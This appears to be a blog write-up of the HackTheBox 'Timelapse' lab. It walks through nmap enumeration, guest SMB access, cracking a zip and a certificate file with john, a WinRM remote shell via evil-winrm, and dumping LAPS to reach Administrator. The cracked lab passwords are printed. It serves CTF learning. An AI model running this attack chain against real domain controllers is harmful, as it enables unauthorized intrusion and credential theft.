---
layout: post
title: Timelapse HackTheBox Writeup
subtitle: Compromissing Domain Controller Host
tags: [HTB]
---


![Timelapse](https://www.hackthebox.com/storage/avatars/bae443f73a706fc8eebc6fb740128295.png)

# Enumeration

The nmap scan gives us 445 which is SMB and port 139 - NetBIOS. 

```
Nmap 7.92 scan initiated Sun May  8 10:10:56 2022 as: nmap -sV -T4 -sC -v -p- -oA nmap/timelapse.htb 10.10.11.152
Nmap scan report for timelapse.htb (10.10.11.152)
Host is up (0.082s latency).
Not shown: 65517 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-05-08 21:16:12Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5986/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_ssl-date: 2022-05-08T21:17:43+00:00; +7h00m13s from scanner time.
|_http-server-header: Microsoft-HTTPAPI/2.0
| tls-alpn: 
|_  http/1.1
|_http-title: Not Found
| ssl-cert: Subject: commonName=dc01.timelapse.htb
| Issuer: commonName=dc01.timelapse.htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-10-25T14:05:29
| Not valid after:  2022-10-25T14:25:29
| MD5:   e233 a199 4504 0859 013f b9c5 e4f6 91c3
|_SHA-1: 5861 acf7 76b8 703f d01e e25d fc7c 9952 a447 7652
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49696/tcp open  msrpc         Microsoft Windows RPC
55871/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2022-05-08T21:17:06
|_  start_date: N/A
|_clock-skew: mean: 7h00m12s, deviation: 0s, median: 7h00m12s

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done at Sun May  8 10:17:31 2022 -- 1 IP address (1 host up) scanned in 395.36 seconds
```

Let's try to authenticate to SMB on port 445 using Guest account without providing password and download all the files from 'Shares'.

```
smbclient -U 'Guest' \\\\10.10.11.152/Shares
```

![SMB Guest Auth](https://raw.githubusercontent.com/innxrmxst/innxrmxst.github.io/master/assets/uploads/timelapse/smbclient_guest_auth.png)

After revieving the contents of downloaded files I noticed that Dev/winrm_backup.zip archive is password protected. Let's get get zip hash using zip2john

```
zip2john winrm_backup.zip >> ziphash.txt
```

![zip2john hash](https://raw.githubusercontent.com/innxrmxst/innxrmxst.github.io/master/assets/uploads/timelapse/zip2john.png)

Crack it with 'john':

```
gunzip -d /usr/share/wordlists/rockyou.tar.gz
john --wordlist /usr/share/wordlists/rockyou.txt ziphash.txt
```

![zip cracked](https://raw.githubusercontent.com/innxrmxst/innxrmxst.github.io/master/assets/uploads/timelapse/crack_zip_with_john.png)

The password is 'supremelegacy'.

Now we have a .pfx file extracted from archive, which was protected too. We need to crack the 'legacyy_dev_auth.pfx' file with john the ripper too.

```
unzip winrm_backup.zip
pfx2john winrm_backup.zip >> pfx.hash
john --wordlist=/usr/share/wordlists/rockyou.txt pfx.hash
```

The password is 'thuglegacy'           

![pfx cracked](https://raw.githubusercontent.com/innxrmxst/innxrmxst.github.io/master/assets/uploads/timelapse/crack_pfx_with_john.png)


A PFX file indicates a certificate in PKCS#12 format; it contains the certificate, the intermediate authority certificate necessary for the trustworthiness of the certificate, and the private key to the certificate. Think of it as an archive that stores everything you need to deploy a certificate.




Extracting the certificate and keys from a .pfx file using 'thuglegacy' password.


Run the following command to extract the private key:

```
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out priv.key
```

Run the following command to extract the certificate:

```
openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out cert.crt
```

![pfx extract](https://raw.githubusercontent.com/innxrmxst/innxrmxst.github.io/master/assets/uploads/timelapse/extract_pfx_key_and_cert.png)



# Getting initial foothold

Because of 5985 port open, we can use evil-winrm tool to connect to the host user specifying our .crt and .key files.
5985 is a WinRM protocol which can be used to open remote shell.

```
evil-winrm -i 10.10.11.152 -S -c cert.crt -k priv.key -p -u
```
'-S' switch used for SSL connection.

![evil-winrm user](https://raw.githubusercontent.com/innxrmxst/innxrmxst.github.io/master/assets/uploads/timelapse/evilwinrm_ssl_user.png)

# Privilege Escalation

After we uploaded '[winPEASx64.exe](https://github.com/carlospolop/PEASS-ng/releases/download/20220508/winPEASx64.exe)' we noticed interesting history file called 'ConsoleHost_history.txt'.

Let's view it contents:

![history file](https://raw.githubusercontent.com/innxrmxst/innxrmxst.github.io/master/assets/uploads/timelapse/history_file.png)


When we open a file we see username 'svc_deploy' and password 'E3R$Q62^12p7PLlC%KWaxuaV'.
We can use this password to dump LAPS using [LDAP PASSWORD DUMP](https://raw.githubusercontent.com/n00py/LAPSDumper/main/laps.py) script.
Let's grab the ms-Mcs-AdmPwd and authenticate as Administrator.

![Administrator pwn](https://raw.githubusercontent.com/innxrmxst/innxrmxst.github.io/master/assets/uploads/timelapse/administrator_pwn.png)


end.
